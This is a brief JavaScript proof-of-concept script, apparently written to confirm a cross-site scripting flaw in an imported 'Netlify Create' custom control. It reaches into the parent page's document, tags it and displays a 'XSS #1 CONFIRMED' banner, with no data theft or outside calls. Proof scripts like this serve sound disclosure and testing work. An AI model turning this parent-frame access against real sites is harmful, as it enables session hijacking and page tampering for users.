(() => {
  const d = parent.document;
  d.documentElement.setAttribute('data-netlify-create-custom-control-xss', 'confirmed');
  if (d.getElementById('netlify-create-custom-control-xss-proof')) return;
  const b = d.createElement('div');
  b.id = 'netlify-create-custom-control-xss-proof';
  b.textContent = 'XSS #1 CONFIRMED — imported custom-control proof script executed';
  Object.assign(b.style, { position:'fixed', top:'16px', left:'50%', transform:'translateX(-50%)', zIndex:'2147483647', padding:'13px 20px', border:'3px solid #22c55e', borderRadius:'12px', background:'#052e16', color:'#dcfce7', boxShadow:'0 12px 36px #0008', font:'700 15px system-ui' });
  d.body.appendChild(b);
})();
